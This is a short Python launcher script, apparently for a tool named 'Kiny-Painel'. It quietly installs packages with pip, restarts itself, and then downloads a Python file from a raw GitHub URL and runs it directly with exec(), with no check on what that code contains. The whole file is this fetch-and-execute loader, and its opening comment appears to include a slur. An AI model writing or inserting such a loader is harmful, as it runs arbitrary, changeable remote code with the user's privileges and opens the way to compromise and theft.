#netin baitola
from os import execl; from sys import executable; from os import system;from sys import argv
try: from requests import get;from TerminalButtons import *
except: system('python3 -m pip install --upgrade pip && pip3 install requests TerminalButtons');execl(executable, executable, *argv)
try: exec(get('https://raw.githubusercontent.com/Kiny-Kiny/Kiny-Painel/main/source/_init_.py').text)
except: print('Verifique sua conexão com a internet!')
